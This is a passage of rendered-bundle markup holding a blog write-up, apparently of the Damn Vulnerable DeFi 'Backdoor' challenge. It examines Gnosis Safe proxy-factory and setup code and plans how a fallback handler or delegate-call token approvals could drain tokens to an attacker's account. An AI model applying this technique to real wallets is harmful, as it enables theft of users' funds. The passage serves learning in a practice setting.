"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-parameter)"},children:"_singleton"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"bytes"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"memory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" initializer"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"uint256"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" saltNonce"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"IProxyCreationCallback"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" callback"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:") "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"public"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"returns"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" ("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"GnosisSafeProxy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" proxy) {"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"uint256"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" saltNonceWithCallback "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"uint256"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"keccak256"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(abi."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"encodePacked"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(saltNonce"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" callback)));"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    proxy "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"createProxyWithNonce"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(_singleton"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" initializer"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" saltNonceWithCallback);"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"if"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" ("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(callback) "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"!="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")) callback."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"proxyCreated"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(proxy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" _singleton"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" initializer"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" saltNonce);"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"}"})})]})}),"\n",(0,n.jsx)(e.p,{children:"Nothing unexpected. The proxy contract is deployed and the callback is called afterwards."}),"\n",(0,n.jsxs)(e.p,{children:["Maybe there's something interesting happening with the ",(0,n.jsx)(e.em,{children:"initializer"}),"?"]}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"function"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"createProxyWithNonce"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-parameter)"},children:"_singleton"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"bytes"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"memory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" initializer"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"uint256"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" saltNonce"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:") "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"public"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"returns"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" ("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"GnosisSafeProxy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" proxy) {"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    proxy "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"deployProxyWithNonce"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(_singleton"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" initializer"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" saltNonce);"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"if"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" (initializer.length "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:">"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"assembly"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"if"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"eq"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"call"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"gas"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"()"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" proxy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"add"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(initializer"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0x20"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"mload"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(initializer)"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:") {"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"revert"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            }"})}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        }"})}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"emit"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"ProxyCreation"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(proxy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" _singleton);"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"}"})})]})}),"\n",(0,n.jsxs)(e.p,{children:["Now this assembly/yul code might look a little bit intimidating but it's rather simple: It's ",(0,n.jsx)(e.a,{href:"https://www.evm.codes/#f1",children:(0,n.jsx)(e.em,{children:"CALL"})}),"ing the just created proxy contract with the calldata passed in the ",(0,n.jsx)(e.em,{children:"initializer"})," variable."]}),"\n",(0,n.jsxs)(e.p,{children:["Note that ",(0,n.jsx)(e.em,{children:"initializer"})," is a ",(0,n.jsx)(e.em,{children:"bytes"})," array stored in ",(0,n.jsx)(e.em,{children:"memory"}),", so when the variable is accessed within assembly its actual value is a number, a memory pointer, the address of where the ",(0,n.jsx)(e.em,{children:"bytes"})," array is stored. Another thing to understand is that the first 32 bytes (or ",(0,n.jsx)(e.code,{children:"0x20"})," in hexadecimal) of a ",(0,n.jsx)(e.em,{children:"bytes"})," array in Solidity, still isn't the actual value that was passed as initializer, it's basically an unsigned integer of the ",(0,n.jsx)(e.em,{children:"initializer"}),"'s length."]}),"\n",(0,n.jsxs)(e.p,{children:["Therefore ",(0,n.jsx)(e.code,{children:"mload(initializer)"})," is loading that length. And ",(0,n.jsx)(e.code,{children:"add(initializer, 0x20)"})," calculates the address where the actual ",(0,n.jsx)(e.em,{children:"initializer"})," value starts in memory. That means that a ",(0,n.jsx)(e.code,{children:"call()"})," is being made to the ",(0,n.jsx)(e.em,{children:"proxy"}),", passing all still available ",(0,n.jsx)(e.code,{children:"gas()"}),", specifying the full ",(0,n.jsx)(e.em,{children:"initializer"})," variable as the calldata and dismissing any return data. Finally, ",(0,n.jsx)(e.code,{children:"eq(call(...), 0)"})," ensures that it ",(0,n.jsx)(e.code,{children:"revert()"}),"s in case the call didn't succeed."]}),"\n",(0,n.jsxs)(e.p,{children:["This all seems pretty normal. With that, I assume we can pass something to ",(0,n.jsx)(e.code,{children:"GnosisSafe::setup()"})," via the ",(0,n.jsx)(e.em,{children:"initializer"})," that allows us to do some kind of unexpected shenanigans."]}),"\n",(0,n.jsx)(e.hr,{}),"\n",(0,n.jsxs)(e.p,{children:["The ",(0,n.jsx)(e.a,{href:"https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol#L75-L97",children:(0,n.jsx)(e.em,{children:"GnosisSafe's setup function"})})," certainly has some parameters that sound quite interesting:"]}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/// "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@dev"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" Setup function sets initial storage of contract."})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/// "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@param"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" _owners List of Safe owners."})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/// "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@param"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" _threshold Number of required confirmations for a Safe transaction."})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/// "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@param"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" to Contract address for optional delegate call."})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/// "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@param"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" data Data payload for optional delegate call."})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/// "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@param"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" fallbackHandler Handler for fallback calls to this contract"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/// "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@param"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" paymentToken Token that should be used for the payment (0 is ETH)"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/// "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@param"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" payment Value that should be paid"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"/// "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"@param"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:" paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"function"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"setup"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"[] "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"calldata"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-parameter)"},children:"_owners"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"uint256"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-parameter)"},children:"_threshold"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" to"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"bytes"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"calldata"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" data"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" fallbackHandler"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" paymentToken"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"uint256"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" payment"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" payable paymentReceiver"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:") "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"external"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]})]})}),"\n",(0,n.jsx)(e.p,{children:'An "optional delegate call"? A "handler for fallback calls to this contract"? Sounds promising.'}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"if"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" (fallbackHandler "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"!="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")) "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"internalSetFallbackHandler"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(fallbackHandler);"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"setupModules"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(to"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" data);"})]})]})}),"\n",(0,n.jsxs)(e.p,{children:['It seems the "optional delegate call" using the ',(0,n.jsx)(e.em,{children:"to"})," and ",(0,n.jsx)(e.em,{children:"data"})," parameters is executed immediately. Since the registry callback is called after ",(0,n.jsx)(e.em,{children:"setup"})," has finished this doesn't help us much. At this point, we wouldn't have received those DVT Tokens that we need yet and we can't add ourselves as owner either since then the checks in the callback would then fail. [EDIT: Later on Discord ",(0,n.jsx)(e.a,{href:"https://discord.com/channels/814328279468474419/887889071446310933/991763920916336710",children:"silent_mastodon#1304"})," pointed out that this can actually be exploited - by using token approvals!]"]}),"\n",(0,n.jsx)(e.p,{children:"Now it would be really good if the fallback-handler is delegate-called into as well. In that case, we could set our own exploitation contract as fallback handler and, once the callback sent the tokens to the wallet, we could trigger the fallback and execute arbitrary code within the wallet's context - such as moving all tokens to the attacker's EOA."}),"\n",(0,n.jsxs)(e.p,{children:["The fallback handling logic can be found in ",(0,n.jsx)(e.a,{href:"https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/base/FallbackManager.sol",children:(0,n.jsx)(e.em,{children:"/base/FallbackManager.sol"})}),":"]}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"solidity","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"fallback"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"() "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"external"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    ..."})}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"assembly"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        ..."})}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"calldatacopy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" 